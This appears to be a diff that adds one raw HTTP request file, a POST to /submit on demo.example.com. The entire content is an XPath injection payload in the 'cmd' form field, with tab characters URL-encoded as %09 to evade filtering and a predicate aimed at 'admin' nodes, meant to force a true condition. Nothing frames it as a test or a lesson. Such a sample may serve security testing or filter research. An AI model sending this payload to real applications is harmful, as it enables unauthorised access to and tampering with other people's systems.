@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+Connection: close
+
+cmd=x'%09or%09//admin[not(text())]%09or%09'y
